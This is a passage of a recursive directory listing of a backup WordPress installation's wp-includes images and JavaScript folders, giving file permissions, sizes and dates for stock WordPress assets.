-rw-r--r-- 1 www-data www-data 2.4K Oct 28  2014 spreadsheet.png
-rw-r--r-- 1 www-data www-data  670 Feb 13  2014 text.png
-rw-r--r-- 1 www-data www-data 1.4K Nov  7  2012 video.png

/var/www/backup_wordpress/wp-includes/images/media:
total 44K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 6 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  417 Mar 27  2014 archive.png
-rw-r--r-- 1 www-data www-data  382 Mar 27  2014 audio.png
-rw-r--r-- 1 www-data www-data  274 Mar 25  2014 code.png
-rw-r--r-- 1 www-data www-data  168 Mar 25  2014 default.png
-rw-r--r-- 1 www-data www-data  200 Mar 25  2014 document.png
-rw-r--r-- 1 www-data www-data  319 Mar 25  2014 interactive.png
-rw-r--r-- 1 www-data www-data  188 Mar 25  2014 spreadsheet.png
-rw-r--r-- 1 www-data www-data  188 Mar 25  2014 text.png
-rw-r--r-- 1 www-data www-data  283 Mar 25  2014 video.png

/var/www/backup_wordpress/wp-includes/images/smilies:
total 112K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 6 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 1007 Apr  9  2015 frownie.png
-rw-r--r-- 1 www-data www-data  169 Oct 28  2014 icon_arrow.gif
-rw-r--r-- 1 www-data www-data  173 Oct 28  2014 icon_biggrin.gif
-rw-r--r-- 1 www-data www-data  170 Oct 28  2014 icon_confused.gif
-rw-r--r-- 1 www-data www-data  172 Oct 28  2014 icon_cool.gif
-rw-r--r-- 1 www-data www-data  490 Oct 28  2014 icon_cry.gif
-rw-r--r-- 1 www-data www-data  170 Oct 28  2014 icon_eek.gif
-rw-r--r-- 1 www-data www-data  241 Oct 28  2014 icon_evil.gif
-rw-r--r-- 1 www-data www-data  236 Oct 28  2014 icon_exclaim.gif
-rw-r--r-- 1 www-data www-data  174 Oct 28  2014 icon_idea.gif
-rw-r--r-- 1 www-data www-data  333 Oct 28  2014 icon_lol.gif
-rw-r--r-- 1 www-data www-data  172 Oct 28  2014 icon_mad.gif
-rw-r--r-- 1 www-data www-data  348 Oct 28  2014 icon_mrgreen.gif
-rw-r--r-- 1 www-data www-data  167 Oct 28  2014 icon_neutral.gif
-rw-r--r-- 1 www-data www-data  247 Oct 28  2014 icon_question.gif
-rw-r--r-- 1 www-data www-data  175 Oct 28  2014 icon_razz.gif
-rw-r--r-- 1 www-data www-data  650 Oct 28  2014 icon_redface.gif
-rw-r--r-- 1 www-data www-data  489 Oct 28  2014 icon_rolleyes.gif
-rw-r--r-- 1 www-data www-data  167 Oct 28  2014 icon_sad.gif
-rw-r--r-- 1 www-data www-data  173 Oct 28  2014 icon_smile.gif
-rw-r--r-- 1 www-data www-data  174 Oct 28  2014 icon_surprised.gif
-rw-r--r-- 1 www-data www-data  241 Oct 28  2014 icon_twisted.gif
-rw-r--r-- 1 www-data www-data  168 Oct 28  2014 icon_wink.gif
-rw-r--r-- 1 www-data www-data 1.5K Apr  9  2015 mrgreen.png
-rw-r--r-- 1 www-data www-data 1.3K Apr  9  2015 rolleyes.png
-rw-r--r-- 1 www-data www-data 1008 Apr  9  2015 simple-smile.png

/var/www/backup_wordpress/wp-includes/images/wlw:
total 20K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 6 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 1.4K Nov  7  2012 wp-comments.png
-rw-r--r-- 1 www-data www-data  664 Nov  7  2012 wp-icon.png
-rw-r--r-- 1 www-data www-data 2.4K Oct 28  2014 wp-watermark.png

/var/www/backup_wordpress/wp-includes/js:
total 2.0M
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  12K Jul 20  2015 admin-bar.js
-rw-r--r--  1 www-data www-data 7.1K Jul 20  2015 admin-bar.min.js
-rw-r--r--  1 www-data www-data  16K Dec 31  2015 autosave.js
-rw-r--r--  1 www-data www-data 5.7K Dec 31  2015 autosave.min.js
-rw-r--r--  1 www-data www-data  23K Feb 17  2016 backbone.min.js
-rw-r--r--  1 www-data www-data  29K Nov 17  2012 colorpicker.js
-rw-r--r--  1 www-data www-data  17K Jun 28  2015 colorpicker.min.js
-rw-r--r--  1 www-data www-data 2.7K Nov 18  2015 comment-reply.js
-rw-r--r--  1 www-data www-data 1.1K Nov 18  2015 comment-reply.min.js
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 crop
-rw-r--r--  1 www-data www-data  20K Feb 18  2016 customize-base.js
-rw-r--r--  1 www-data www-data 6.9K Feb 18  2016 customize-base.min.js
-rw-r--r--  1 www-data www-data 6.9K Sep  5  2015 customize-loader.js
-rw-r--r--  1 www-data www-data 3.2K Mar 25  2015 customize-loader.min.js
-rw-r--r--  1 www-data www-data 5.8K Jul 19  2015 customize-models.js
-rw-r--r--  1 www-data www-data 3.4K Apr 25  2014 customize-models.min.js
-rw-r--r--  1 www-data www-data  13K Mar  8  2016 customize-preview-nav-menus.js
-rw-r--r--  1 www-data www-data 4.6K Mar  8  2016 customize-preview-nav-menus.min.js
-rw-r--r--  1 www-data www-data  19K Mar 21  2016 customize-preview-widgets.js
-rw-r--r--  1 www-data www-data 7.5K Mar 21  2016 customize-preview-widgets.min.js
-rw-r--r--  1 www-data www-data 6.4K Mar 14  2016 customize-preview.js
-rw-r--r--  1 www-data www-data 2.9K Mar 14  2016 customize-preview.min.js
-rw-r--r--  1 www-data www-data  26K Mar 21  2016 customize-selective-refresh.js
-rw-r--r--  1 www-data www-data 7.5K Mar 21  2016 customize-selective-refresh.min.js
-rw-r--r--  1 www-data www-data 5.3K Feb 23  2016 customize-views.js
-rw-r--r--  1 www-data www-data 2.9K Feb 23  2016 customize-views.min.js
-rw-r--r--  1 www-data www-data  20K Feb 25  2016 heartbeat.js
-rw-r--r--  1 www-data www-data 5.4K Jul 28  2015 heartbeat.min.js
-rw-r--r--  1 www-data www-data 4.9K Mar 11  2015 hoverIntent.js
-rw-r--r--  1 www-data www-data 1.1K Mar 11  2015 hoverIntent.min.js
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 imgareaselect
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 jcrop
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 jquery
-rw-r--r--  1 www-data www-data  18K Oct  6  2015 json2.js
-rw-r--r--  1 www-data www-data 3.1K Oct  6  2015 json2.min.js
-rw-r--r--  1 www-data www-data  32K Apr  6  2015 masonry.min.js
-rw-r--r--  1 www-data www-data  24K Oct 21  2015 mce-view.js
-rw-r--r--  1 www-data www-data 9.2K Oct 21  2015 mce-view.min.js
-rw-r--r--  1 www-data www-data  22K Feb 17  2016 media-audiovideo.js
-rw-r--r--  1 www-data www-data  13K Feb 17  2016 media-audiovideo.min.js
-rw-r--r--  1 www-data www-data  30K Sep 16  2015 media-editor.js
-rw-r--r--  1 www-data www-data  11K Sep 16  2015 media-editor.min.js
-rw-r--r--  1 www-data www-data  24K Feb 24  2016 media-grid.js
-rw-r--r--  1 www-data www-data  14K Feb 24  2016 media-grid.min.js
-rw-r--r--  1 www-data www-data  41K Jul 20  2015 media-models.js
-rw-r--r--  1 www-data www-data  14K Jul  6  2015 media-models.min.js
-rw-r--r--  1 www-data www-data 225K Mar 30  2016 media-views.js
-rw-r--r--  1 www-data www-data 102K Mar 30  2016 media-views.min.js
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 mediaelement
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 plupload
-rw-r--r--  1 www-data www-data  22K Jun 21  2015 quicktags.js
-rw-r--r--  1 www-data www-data  11K Jun 28  2015 quicktags.min.js
-rw-r--r--  1 www-data www-data  11K Oct  7  2015 shortcode.js
-rw-r--r--  1 www-data www-data 2.6K Oct  7  2015 shortcode.min.js
-rw-r--r--  1 www-data www-data  10K Apr 17  2012 swfobject.js
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 swfupload
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 thickbox
drwxr-xr-x  7 www-data www-data 4.0K Apr 12  2016 tinymce
-rw-r--r--  1 www-data www-data 4.9K Aug 22  2012 tw-sack.js
-rw-r--r--  1 www-data www-data 3.3K Jun 28  2015 tw-sack.min.js
-rw-r--r--  1 www-data www-data  24K Mar  9  2016 twemoji.js
-rw-r--r--  1 www-data www-data 7.0K Mar  9  2016 twemoji.min.js
-rw-r--r--  1 www-data www-data  17K Feb 17  2016 underscore.min.js
-rw-r--r--  1 www-data www-data 4.5K Sep  8  2015 utils.js
-rw-r--r--  1 www-data www-data 1.8K Sep  8  2015 utils.min.js
-rw-r--r--  1 www-data www-data 2.2K Jul 13  2015 wp-a11y.js
-rw-r--r--  1 www-data www-data  643 Jun 29  2015 wp-a11y.min.js
-rw-r--r--  1 www-data www-data 3.1K Jan 13  2016 wp-ajax-response.js
-rw-r--r--  1 www-data www-data 2.1K Jan 13  2016 wp-ajax-response.min.js
-rw-r--r--  1 www-data www-data 3.3K Jan 13  2016 wp-auth-check.js
-rw-r--r--  1 www-data www-data 1.8K Jan 13  2016 wp-auth-check.min.js
-rw-r--r--  1 www-data www-data  11K Jan 14  2016 wp-backbone.js
-rw-r--r--  1 www-data www-data 3.0K Jan 14  2016 wp-backbone.min.js
-rw-r--r--  1 www-data www-data 5.8K Feb 23  2016 wp-embed-template.js
-rw-r--r--  1 www-data www-data 2.9K Feb 23  2016 wp-embed-template.min.js
-rw-r--r--  1 www-data www-data 3.1K Feb 25  2016 wp-embed.js
-rw-r--r--  1 www-data www-data 1.4K Feb 25  2016 wp-embed.min.js
-rw-r--r--  1 www-data www-data 4.8K Mar 16  2016 wp-emoji-loader.js
-rw-r--r--  1 www-data www-data 1.7K Mar 16  2016 wp-emoji-loader.min.js
-rw-r--r--  1 www-data www-data 9.6K Mar 13  2016 wp-emoji-release.min.js
-rw-r--r--  1 www-data www-data 5.7K Mar 13  2016 wp-emoji.js
-rw-r--r--  1 www-data www-data 2.6K Mar 13  2016 wp-emoji.min.js
-rw-r--r--  1 www-data www-data  914 Nov 14  2013 wp-list-revisions.js
-rw-r--r--  1 www-data www-data  571 Nov 13  2013 wp-list-revisions.min.js
-rw-r--r--  1 www-data www-data  12K Jan 13  2016 wp-lists.js
-rw-r--r--  1 www-data www-data 7.2K Jan 13  2016 wp-lists.min.js
-rw-r--r--  1 www-data www-data 6.5K Nov 14  2013 wp-pointer.js
-rw-r--r--  1 www-data www-data 3.6K Nov 13  2013 wp-pointer.min.js
-rw-r--r--  1 www-data www-data 3.7K Jun 13  2015 wp-util.js
-rw-r--r--  1 www-data www-data 1.1K Jun 13  2015 wp-util.min.js
-rw-r--r--  1 www-data www-data  435 Dec 28  2013 wpdialog.js
-rw-r--r--  1 www-data www-data  237 Dec 28  2013 wpdialog.min.js
-rw-r--r--  1 www-data www-data  20K Apr  1  2016 wplink.js
-rw-r--r--  1 www-data www-data  11K Apr  1  2016 wplink.min.js
-rw-r--r--  1 www-data www-data  502 Nov 12  2013 zxcvbn-async.js
-rw-r--r--  1 www-data www-data  324 Jan 28  2014 zxcvbn-async.min.js
-rw-r--r--  1 www-data www-data 683K Dec  4  2013 zxcvbn.min.js

/var/www/backup_wordpress/wp-includes/js/crop:
total 40K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 2.9K Dec 20  2012 cropper.css
-rw-r--r--  1 www-data www-data  17K May  4  2007 cropper.js
-rw-r--r--  1 www-data www-data  277 Nov  7  2012 marqueeHoriz.gif
-rw-r--r--  1 www-data www-data  293 Nov  7  2012 marqueeVert.gif

/var/www/backup_wordpress/wp-includes/js/imgareaselect:
total 72K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  178 Nov  7  2012 border-anim-h.gif
-rw-r--r--  1 www-data www-data  178 Nov  7  2012 border-anim-v.gif
-rw-r--r--  1 www-data www-data  790 Apr 25  2012 imgareaselect.css
-rw-r--r--  1 www-data www-data  38K Jul 20  2015 jquery.imgareaselect.js
-rw-r--r--  1 www-data www-data 9.7K Jul 20  2015 jquery.imgareaselect.min.js

/var/www/backup_wordpress/wp-includes/js/jcrop:
total 32K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  323 Nov  7  2012 Jcrop.gif
-rw-r--r--  1 www-data www-data 2.1K Sep 21  2013 jquery.Jcrop.min.css
-rw-r--r--  1 www-data www-data  16K Sep 21  2013 jquery.Jcrop.min.js

/var/www/backup_wordpress/wp-includes/js/jquery:
total 268K
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  22K Mar 23  2016 jquery-migrate.js
-rw-r--r--  1 www-data www-data 9.5K Mar 23  2016 jquery-migrate.min.js
-rw-r--r--  1 www-data www-data 9.1K Apr 10  2013 jquery.color.min.js
-rw-r--r--  1 www-data www-data  41K Sep 16  2013 jquery.form.js
-rw-r--r--  1 www-data www-data  15K Sep 16  2013 jquery.form.min.js
-rw-r--r--  1 www-data www-data 5.5K Jan  1  2014 jquery.hotkeys.js
-rw-r--r--  1 www-data www-data 1.8K Aug 22  2012 jquery.hotkeys.min.js
-rw-r--r--  1 www-data www-data  95K Apr  6  2016 jquery.js
-rw-r--r--  1 www-data www-data 1.8K Mar 27  2014 jquery.masonry.min.js
-rw-r--r--  1 www-data www-data 3.7K Jan 29  2013 jquery.query.js
-rw-r--r--  1 www-data www-data 3.4K Jan 10  2008 jquery.schedule.js
-rw-r--r--  1 www-data www-data  783 Jan 20  2011 jquery.serialize-object.js
-rw-r--r--  1 www-data www-data 3.7K Nov 14  2013 jquery.table-hotkeys.js
-rw-r--r--  1 www-data www-data 2.3K Aug 22  2012 jquery.table-hotkeys.min.js
-rw-r--r--  1 www-data www-data 1.2K Apr 10  2012 jquery.ui.touch-punch.js
-rw-r--r--  1 www-data www-data 6.9K Jan 13  2016 suggest.js
-rw-r--r--  1 www-data www-data 3.0K Jan 13  2016 suggest.min.js
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 ui

/var/www/backup_wordpress/wp-includes/js/jquery/ui:
total 340K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 8.4K Nov  7  2015 accordion.min.js
-rw-r--r-- 1 www-data www-data 8.1K Nov  7  2015 autocomplete.min.js
-rw-r--r-- 1 www-data www-data 7.1K Nov  7  2015 button.min.js
-rw-r--r-- 1 www-data www-data 4.0K Nov  7  2015 core.min.js
-rw-r--r-- 1 www-data www-data  36K Nov  7  2015 datepicker.min.js
-rw-r--r-- 1 www-data www-data  12K Nov  7  2015 dialog.min.js
-rw-r--r-- 1 www-data www-data  19K Nov  7  2015 draggable.min.js
-rw-r--r-- 1 www-data www-data 6.2K Nov  7  2015 droppable.min.js
-rw-r--r-- 1 www-data www-data 1.2K Nov  7  2015 effect-blind.min.js
-rw-r--r-- 1 www-data www-data 1.3K Nov  7  2015 effect-bounce.min.js
-rw-r--r-- 1 www-data www-data  918 Nov  7  2015 effect-clip.min.js
-rw-r--r-- 1 www-data www-data  997 Nov  7  2015 effect-drop.min.js
-rw-r--r-- 1 www-data www-data 1.2K Nov  7  2015 effect-explode.min.js
-rw-r--r-- 1 www-data www-data  515 Nov  7  2015 effect-fade.min.js
-rw-r--r-- 1 www-data www-data 1.1K Nov  7  2015 effect-fold.min.js
-rw-r--r-- 1 www-data www-data  789 Nov  7  2015 effect-highlight.min.js
-rw-r--r-- 1 www-data www-data  783 Nov  7  2015 effect-puff.min.js
-rw-r--r-- 1 www-data www-data  800 Nov  7  2015 effect-pulsate.min.js
-rw-r--r-- 1 www-data www-data 1.1K Nov  7  2015 effect-scale.min.js
-rw-r--r-- 1 www-data www-data 1.1K Nov  7  2015 effect-shake.min.js
-rw-r--r-- 1 www-data www-data 3.3K Nov  7  2015 effect-size.min.js
-rw-r--r-- 1 www-data www-data  962 Nov  7  2015 effect-slide.min.js
-rw-r--r-- 1 www-data www-data  857 Nov  7  2015 effect-transfer.min.js
-rw-r--r-- 1 www-data www-data  14K Nov  7  2015 effect.min.js
-rw-r--r-- 1 www-data www-data 9.4K Nov  7  2015 menu.min.js
-rw-r--r-- 1 www-data www-data 3.1K Nov  7  2015 mouse.min.js
-rw-r--r-- 1 www-data www-data 6.4K Nov  7  2015 position.min.js
-rw-r--r-- 1 www-data www-data 2.5K Nov  7  2015 progressbar.min.js
-rw-r--r-- 1 www-data www-data  18K Nov  7  2015 resizable.min.js
-rw-r--r-- 1 www-data www-data 4.2K Nov  7  2015 selectable.min.js
-rw-r--r-- 1 www-data www-data 8.2K Nov  7  2015 selectmenu.min.js
-rw-r--r-- 1 www-data www-data  11K Nov  7  2015 slider.min.js
-rw-r--r-- 1 www-data www-data  25K Nov  7  2015 sortable.min.js
-rw-r--r-- 1 www-data www-data 7.0K Nov  7  2015 spinner.min.js
-rw-r--r-- 1 www-data www-data  12K Nov  7  2015 tabs.min.js
-rw-r--r-- 1 www-data www-data 5.6K Nov  7  2015 tooltip.min.js
-rw-r--r-- 1 www-data www-data 6.8K Nov  7  2015 widget.min.js

/var/www/backup_wordpress/wp-includes/js/mediaelement:
total 344K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  166 Mar 15  2013 background.png
-rw-r--r--  1 www-data www-data 3.0K Mar 15  2013 bigplay.png
-rw-r--r--  1 www-data www-data 1.1K Sep 11  2015 bigplay.svg
-rw-r--r--  1 www-data www-data 1.9K Mar 15  2013 controls.png
-rw-r--r--  1 www-data www-data  11K Mar 15  2013 controls.svg
-rw-r--r--  1 www-data www-data 129K Sep 11  2015 flashmediaelement.swf
-rw-r--r--  1 www-data www-data 1.8K Jan  9  2015 froogaloop.min.js
-rw-r--r--  1 www-data www-data 1.6K Sep 11  2015 jumpforward.png
-rw-r--r--  1 www-data www-data 6.1K Mar 15  2013 loading.gif
-rw-r--r--  1 www-data www-data  79K Sep 19  2015 mediaelement-and-player.min.js
-rw-r--r--  1 www-data www-data  20K Sep 11  2015 mediaelementplayer.min.css
-rw-r--r--  1 www-data www-data  13K Mar  5  2015 silverlightmediaelement.xap
-rw-r--r--  1 www-data www-data 4.2K Nov 29  2014 skipback.png
-rw-r--r--  1 www-data www-data 5.2K Mar  9  2016 wp-mediaelement.css
-rw-r--r--  1 www-data www-data 1.5K Jan 20  2016 wp-mediaelement.js
-rw-r--r--  1 www-data www-data 4.4K Mar  9  2016 wp-mediaelement.min.css
-rw-r--r--  1 www-data www-data  796 Feb 29  2016 wp-mediaelement.min.js
-rw-r--r--  1 www-data www-data 4.7K Feb 29  2016 wp-playlist.js
-rw-r--r--  1 www-data www-data 3.3K Feb 29  2016 wp-playlist.min.js

/var/www/backup_wordpress/wp-includes/js/plupload:
total 288K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  16K Mar  9  2015 handlers.js
-rw-r--r--  1 www-data www-data  11K Mar  9  2015 handlers.min.js
-rw-r--r--  1 www-data www-data  18K Jul 29  2011 license.txt
-rw-r--r--  1 www-data www-data  30K Oct 10  2015 plupload.flash.swf
-rw-r--r--  1 www-data www-data 111K Oct 10  2015 plupload.full.min.js
-rw-r--r--  1 www-data www-data  62K Oct 10  2015 plupload.silverlight.xap
-rw-r--r--  1 www-data www-data  13K Feb 25  2016 wp-plupload.js
-rw-r--r--  1 www-data www-data 4.8K Sep 11  2015 wp-plupload.min.js

/var/www/backup_wordpress/wp-includes/js/swfupload:
total 100K
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  13K Feb 24  2014 handlers.js
-rw-r--r--  1 www-data www-data 8.7K Jun 21  2013 handlers.min.js
-rw-r--r--  1 www-data www-data 1.6K Jul 29  2011 license.txt
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 plugins
-rw-r--r--  1 www-data www-data  37K Aug 12  2014 swfupload.js
-rw-r--r--  1 www-data www-data  13K Jul 29  2013 swfupload.swf

/var/www/backup_wordpress/wp-includes/js/swfupload/plugins:
total 32K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 1.6K Jul 29  2011 swfupload.cookies.js
-rw-r--r-- 1 www-data www-data 3.4K Jul 29  2011 swfupload.queue.js
-rw-r--r-- 1 www-data www-data  12K Jul 29  2011 swfupload.speed.js
-rw-r--r-- 1 www-data www-data 3.9K Jul 29  2011 swfupload.swfobject.js

/var/www/backup_wordpress/wp-includes/js/thickbox:
total 48K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  15K Nov  5  2012 loadingAnimation.gif
-rw-r--r--  1 www-data www-data   94 Nov  7  2012 macFFBgHack.png
-rw-r--r--  1 www-data www-data 2.4K Mar 10  2016 thickbox.css
-rw-r--r--  1 www-data www-data  13K Mar 10  2016 thickbox.js

/var/www/backup_wordpress/wp-includes/js/tinymce:
total 608K
drwxr-xr-x  7 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 11 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 langs
-rw-r--r--  1 www-data www-data  26K Apr 11  2011 license.txt
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 plugins
drwxr-xr-x  4 www-data www-data 4.0K Apr 12  2016 skins
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 themes
-rw-r--r--  1 www-data www-data  15K Jun 30  2015 tiny_mce_popup.js
-rw-r--r--  1 www-data www-data 365K Mar 23  2016 tinymce.min.js
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 utils
-rw-r--r--  1 www-data www-data 164K Apr 11  2016 wp-tinymce.js.gz
-rw-r--r--  1 www-data www-data 1.1K Jan  2  2015 wp-tinymce.php

/var/www/backup_wordpress/wp-includes/js/tinymce/langs:
total 24K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  16K Dec 16  2014 wp-langs-en.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins:
total 96K
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x  7 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 charmap
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 colorpicker
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 compat3x
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 directionality
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 fullscreen
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 hr
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 image
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 lists
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 media
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 paste
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 tabfocus
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 textcolor
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wordpress
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wpautoresize
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wpdialogs
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wpeditimage
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wpembed
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wpemoji
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wpgallery
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wplink
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wptextpattern
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 wpview

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/charmap:
total 28K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  11K Jan 19  2016 plugin.js
-rw-r--r--  1 www-data www-data 7.8K Feb 19  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/colorpicker:
total 16K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 2.4K Jun 30  2015 plugin.js
-rw-r--r--  1 www-data www-data 1.2K Feb 19  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/compat3x:
total 28K
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 css
-rw-r--r--  1 www-data www-data 8.1K Jan 19  2016 plugin.js
-rw-r--r--  1 www-data www-data 3.9K Mar 18  2014 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/compat3x/css:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 7.9K Jun 18  2015 dialog.css

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/directionality:
total 16K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 1.5K Jun 30  2015 plugin.js
-rw-r--r--  1 www-data www-data  726 Feb 19  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/fullscreen:
total 16K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 3.5K Mar  1  2016 plugin.js
-rw-r--r--  1 www-data www-data 1.7K Mar  1  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/hr:
total 16K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  648 Jun 30  2015 plugin.js
-rw-r--r--  1 www-data www-data  322 Feb 19  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/image:
total 40K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  17K Jan 19  2016 plugin.js
-rw-r--r--  1 www-data www-data 8.3K Jan 19  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/lists:
total 44K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  21K Mar 15  2016 plugin.js
-rw-r--r--  1 www-data www-data 8.4K Mar 15  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/media:
total 64K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  20K Dec 28  2013 moxieplayer.swf
-rw-r--r--  1 www-data www-data  22K Mar  1  2016 plugin.js
-rw-r--r--  1 www-data www-data  12K Mar  2  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/paste:
total 72K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data  48K Mar  1  2016 plugin.js
-rw-r--r--  1 www-data www-data  16K Mar  1  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/tabfocus:
total 16K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 2.5K Jan 19  2016 plugin.js
-rw-r--r--  1 www-data www-data 1.3K Feb 19  2016 plugin.min.js

/var/www/backup_wordpress/wp-includes/js/tinymce/plugins/textcolor:
total 20K
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 24 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r--  1 www-data www-data 6.5K Jun 30  2015 plugin.js
